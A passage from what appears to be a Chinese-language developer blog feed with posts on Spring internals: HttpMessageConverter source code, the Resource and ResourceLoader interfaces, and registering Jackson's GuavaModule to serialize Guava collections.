HttpMessageConverter&lt;?&gt;&gt;) messageConverter.getClass(),</span><br><span class="line">                            inputMessage, outputMessage);</span><br><span class="line">                    <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        addContentDispositionHeader(inputMessage, outputMessage);</span><br><span class="line">                        ((HttpMessageConverter&lt;T&gt;) messageConverter).write(returnValue,</span><br><span class="line">                                selectedMediaType, outputMessage);</span><br><span class="line">                        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                            logger.debug(<span class="string">"Written ["</span> + returnValue + <span class="string">"] as \""</span> +</span><br><span class="line">                                    selectedMediaType + <span class="string">"\" using ["</span> + messageConverter + <span class="string">"]"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpMediaTypeNotAcceptableException(<span class="keyword">this</span>.allSupportedMediaTypes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>至此，HttpMessageConverter如何工作的就真相大白了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="http://www.cnblogs.com/fangjian0423/p/springMVC-xml-json-convert.html" rel="external nofollow noopener noreferrer" target="_blank">SpringMVC关于json、xml自动转换的原理研究(附带源码分析)</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> messageConverter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring-resource源码剖析]]></title>
      <url>http://qsli.github.io/2016/11/20/spring-resource/</url>
      <content type="html"><![CDATA[<h1 id="Spring-Resource"><a href="#Spring-Resource" class="headerlink" title="Spring Resource"></a>Spring Resource</h1><h2 id="Why-not-Java-URL类"><a href="#Why-not-Java-URL类" class="headerlink" title="Why not Java URL类"></a>Why not Java URL类</h2><p>原因： 对底层资源的支持不足。</p>
<ol>
<li><p>there is no standardized URL implementation that may be used to access a resource that needs to be obtained from the classpath,or relative to a ServletContext.</p>
</li>
<li><p>不自定义URL handler的原因：</p>
<p>a. 过于复杂<br>b. lack some desirable functionality（如对URL所指资源是否存在的判断）</p>
</li>
</ol>
<h2 id="Resource-接口"><a href="#Resource-接口" class="headerlink" title="Resource 接口"></a>Resource 接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InputStreamSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return an &#123;<span class="doctag">@link</span> InputStream&#125;.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;It is expected that each call creates a &lt;i&gt;fresh&lt;/i&gt; stream.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This requirement is particularly important when you consider an API such</span></span><br><span class="line"><span class="comment">	 * as JavaMail, which needs to be able to read the stream multiple times when</span></span><br><span class="line"><span class="comment">	 * creating mail attachments. For such a use case, it is &lt;i&gt;required&lt;/i&gt;</span></span><br><span class="line"><span class="comment">	 * that each &#123;<span class="doctag">@code</span> getInputStream()&#125; call returns a fresh stream.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the input stream for the underlying resource (must not be &#123;<span class="doctag">@code</span> null&#125;)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the stream could not be opened</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.mail.javamail.MimeMessageHelper#addAttachment(String, InputStreamSource)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Resource</span> <span class="keyword">extends</span> <span class="title">InputStreamSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether this resource actually exists in physical form.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This method performs a definitive existence check, whereas the</span></span><br><span class="line"><span class="comment">	 * existence of a &#123;<span class="doctag">@code</span> Resource&#125; handle only guarantees a</span></span><br><span class="line"><span class="comment">	 * valid descriptor handle.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">exists</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether the contents of this resource can be read,</span></span><br><span class="line"><span class="comment">	 * e.g. via &#123;<span class="doctag">@link</span> #getInputStream()&#125; or &#123;<span class="doctag">@link</span> #getFile()&#125;.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will be &#123;<span class="doctag">@code</span> true&#125; for typical resource descriptors;</span></span><br><span class="line"><span class="comment">	 * note that actual content reading may still fail when attempted.</span></span><br><span class="line"><span class="comment">	 * However, a value of &#123;<span class="doctag">@code</span> false&#125; is a definitive indication</span></span><br><span class="line"><span class="comment">	 * that the resource content cannot be read.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #getInputStream()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isReadable</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether this resource represents a handle with an open</span></span><br><span class="line"><span class="comment">	 * stream. If true, the InputStream cannot be read multiple times,</span></span><br><span class="line"><span class="comment">	 * and must be read and closed to avoid resource leaks.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will be &#123;<span class="doctag">@code</span> false&#125; for typical resource descriptors.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isOpen</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a URL handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as URL,</span></span><br><span class="line"><span class="comment">	 * i.e. if the resource is not available as descriptor</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">URL <span class="title">getURL</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a URI handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as URI,</span></span><br><span class="line"><span class="comment">	 * i.e. if the resource is not available as descriptor</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">URI <span class="title">getURI</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a File handle for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved as absolute</span></span><br><span class="line"><span class="comment">	 * file path, i.e. if the resource is not available in a file system</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">File <span class="title">getFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the content length for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved</span></span><br><span class="line"><span class="comment">	 * (in the file system or as some other known physical resource type)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">long</span> <span class="title">contentLength</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine the last-modified timestamp for this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the resource cannot be resolved</span></span><br><span class="line"><span class="comment">	 * (in the file system or as some other known physical resource type)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">long</span> <span class="title">lastModified</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Create a resource relative to this resource.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> relativePath the relative path (relative to this resource)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resource handle for the relative resource</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException if the relative resource cannot be determined</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Resource <span class="title">createRelative</span><span class="params">(String relativePath)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Determine a filename for this resource, i.e. typically the last</span></span><br><span class="line"><span class="comment">	 * part of the path: for example, "myfile.txt".</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Returns &#123;<span class="doctag">@code</span> null&#125; if this type of resource does not</span></span><br><span class="line"><span class="comment">	 * have a filename.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">getFilename</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a description for this resource,</span></span><br><span class="line"><span class="comment">	 * to be used for error output when working with the resource.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Implementations are also encouraged to return this value</span></span><br><span class="line"><span class="comment">	 * from their &#123;<span class="doctag">@code</span> toString&#125; method.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> Object#toString()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="继承体系"><a href="#继承体系" class="headerlink" title="继承体系"></a>继承体系</h3><img src="/2016/11/20/spring-resource/resource.jpg">
<h2 id="ResourceLoader"><a href="#ResourceLoader" class="headerlink" title="ResourceLoader"></a>ResourceLoader</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ResourceLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Pseudo URL prefix for loading from the class path: "classpath:" */</span></span><br><span class="line">	String CLASSPATH_URL_PREFIX = ResourceUtils.CLASSPATH_URL_PREFIX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return a Resource handle for the specified resource.</span></span><br><span class="line"><span class="comment">	 * The handle should always be a reusable resource descriptor,</span></span><br><span class="line"><span class="comment">	 * allowing for multiple &#123;<span class="doctag">@link</span> Resource#getInputStream()&#125; calls.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;&lt;ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Must support fully qualified URLs, e.g. "file:C:/test.dat".</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Must support classpath pseudo-URLs, e.g. "classpath:test.dat".</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;Should support relative file paths, e.g. "WEB-INF/test.dat".</span></span><br><span class="line"><span class="comment">	 * (This will be implementation-specific, typically provided by an</span></span><br><span class="line"><span class="comment">	 * ApplicationContext implementation.)</span></span><br><span class="line"><span class="comment">	 * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Note that a Resource handle does not imply an existing resource;</span></span><br><span class="line"><span class="comment">	 * you need to invoke &#123;<span class="doctag">@link</span> Resource#exists&#125; to check for existence.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> location the resource location</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> a corresponding Resource handle</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #CLASSPATH_URL_PREFIX</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.Resource#exists</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.Resource#getInputStream</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">Resource <span class="title">getResource</span><span class="params">(String location)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Expose the ClassLoader used by this ResourceLoader.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Clients which need to access the ClassLoader directly can do so</span></span><br><span class="line"><span class="comment">	 * in a uniform manner with the ResourceLoader, rather than relying</span></span><br><span class="line"><span class="comment">	 * on the thread context ClassLoader.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the ClassLoader (only &#123;<span class="doctag">@code</span> null&#125; if even the system</span></span><br><span class="line"><span class="comment">	 * ClassLoader isn't accessible)</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.util.ClassUtils#getDefaultClassLoader()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">ClassLoader <span class="title">getClassLoader</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ResourceLoader　负责加载Resource, 所有的application context都实现了这个接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resource template = ctx.getResource(<span class="string">"some/resource/path/myTemplate.txt"</span>);</span><br></pre></td></tr></table></figure>
<p>如果上述的ctx的类型是 ClassPathXmlApplicationContext，那么返回的Resource的具体类型就是</p>
<p>ClassPathResource； 如果ctx的类型是FileSystemXmlApplicationContext, 返回的类型就变成了</p>
<p>FileSystemResource。</p>
<h3 id="指定返回的Resource类型"><a href="#指定返回的Resource类型" class="headerlink" title="指定返回的Resource类型"></a>指定返回的Resource类型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Resource template = ctx.getResource(<span class="string">"classpath:some/resource/path/myTemplate.txt"</span>);</span><br></pre></td></tr></table></figure>
<p>通过显式的指定classpath前缀，返回的Resource的实际类型就是 ClassPathResource</p>
<p>对应的关系见表格：</p>
<table>
<thead>
<tr>
<th>Prefix</th>
<th>Example</th>
<th>Explanation</th>
</tr>
</thead>
<tbody>
<tr>
<td>classpath:</td>
<td>classpath:com/myapp/config.xml</td>
<td>Loaded from the classpath</td>
</tr>
<tr>
<td>file:</td>
<td>file:///data/config.xml</td>
<td>Loaded as a URL, from the system</td>
</tr>
<tr>
<td>http:</td>
<td><a href="http://myserver/logo.png" rel="external nofollow noopener noreferrer" target="_blank">http://myserver/logo.png</a></td>
<td>Loaded as a URL</td>
</tr>
<tr>
<td>（none）</td>
<td>/data/config.xml</td>
<td>Depends on the underlying ApplicationContext</td>
</tr>
</tbody>
</table>
<h4 id="classpath"><a href="#classpath" class="headerlink" title="classpath*"></a>classpath*</h4><p>classpath*:conf/appContext.xml</p>
<p>这个特殊的前缀会使spring在所有的ClassPath中查找和指定的名字相同的资源，他们会合并形成最终的</p>
<p>上下文。</p>
<blockquote>
<p>This special prefix specifies that all classpath resources that match the given name must be obtained<br>(internally, this essentially happens via a ClassLoader.getResources(…) call), and then merged<br>to form the final application context definition.</p>
</blockquote>
<h3 id="ResourceLoaderAware"><a href="#ResourceLoaderAware" class="headerlink" title="ResourceLoaderAware"></a>ResourceLoaderAware</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ResourceLoaderAware</span> <span class="keyword">extends</span> <span class="title">Aware</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Set the ResourceLoader that this object runs in.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;This might be a ResourcePatternResolver, which can be checked</span></span><br><span class="line"><span class="comment">	 * through &#123;<span class="doctag">@code</span> instanceof ResourcePatternResolver&#125;. See also the</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@code</span> ResourcePatternUtils.getResourcePatternResolver&#125; method.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Invoked after population of normal bean properties but before an init callback</span></span><br><span class="line"><span class="comment">	 * like InitializingBean's &#123;<span class="doctag">@code</span> afterPropertiesSet&#125; or a custom init-method.</span></span><br><span class="line"><span class="comment">	 * Invoked before ApplicationContextAware's &#123;<span class="doctag">@code</span> setApplicationContext&#125;.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> resourceLoader ResourceLoader object to be used by this object</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.support.ResourcePatternResolver</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> org.springframework.core.io.support.ResourcePatternUtils#getResourcePatternResolver</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setResourceLoader</span><span class="params">(ResourceLoader resourceLoader)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现这个接口的类，可以获得所在容器的ResourceLoader实例，一般来说就是相应的Application Context。也可以当做</p>
<p>ApplicationContextAware的替代。</p>
<blockquote>
<p>  Interface to be implemented by any object that wishes to be notified of<br>  the <b>ResourceLoader</b> (typically the ApplicationContext) that it runs in.<br>  This is an alternative to a full ApplicationContext dependency via the<br>  ApplicationContextAware interface.</p>
</blockquote>
<p>除了实现上述接口，还可以使用基于类型的注入，将ResourceLoader注入到需要的地方。</p>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> resource </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jackson对guava新增集合的支持]]></title>
      <url>http://qsli.github.io/2016/11/16/jackson-guava/</url>
      <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Guava中新增了不少好用的集合比如<code>MultiMap</code>、<code>MultiSet</code>、<code>Table</code>等，当使用jackson进行序列化的时候</p>
<p>这些集合并不能正确的序列化，出现下面的情况：</p>
<p>正常序列化应该为：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"fields"</span>:&#123;</span><br><span class="line">    <span class="attr">"Field1"</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"index"</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">"header"</span>:<span class="string">"Field1"</span>,</span><br><span class="line">        <span class="attr">"fieldType"</span>:<span class="string">"fieldtype"</span>,</span><br><span class="line">        <span class="attr">"description"</span>:<span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"cleanHeader"</span>:<span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"Field2"</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"index"</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">"header"</span>:<span class="string">"Field2"</span>,</span><br><span class="line">        <span class="attr">"fieldType"</span>:<span class="string">"fieldtype"</span>,</span><br><span class="line">        <span class="attr">"description"</span>:<span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"cleanHeader"</span>:<span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用默认的spring出现的是：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"fields"</span>:&#123;</span><br><span class="line">    <span class="attr">"empty"</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>要解决这个问题就要手动向jackson的ObjectMapper中注册一个Module</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Table study = getTable();</span><br><span class="line"></span><br><span class="line">ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">mapper.registerModule(<span class="keyword">new</span> GuavaModule());</span><br><span class="line"></span><br><span class="line">String tableString = mapper.writeValueAsString(table);</span><br></pre></td></tr></table></figure>
<p>这个<code>GuavaModule</code>是jackson对Guava集合支持的包，它的maven依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.datatype<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-datatype-guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也可以使用基于xml配置的方式将这个Module导入<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- JSON parser configuration--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"guavaObjectMapper"</span> <span class="attr">class</span>=<span class="string">"com.fasterxml.jackson.databind.ObjectMapper"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.config.MethodInvokingFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetObject"</span>&gt;</span><span class="tag">&lt;<span class="name">ref</span> <span class="attr">local</span>=<span class="string">"guavaObjectMapper"</span> /&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetMethod"</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>registerModule<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"arguments"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"guavaModule"</span> <span class="attr">class</span>=<span class="string">"com.fasterxml.jackson.datatype.guava.GuavaModule"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span 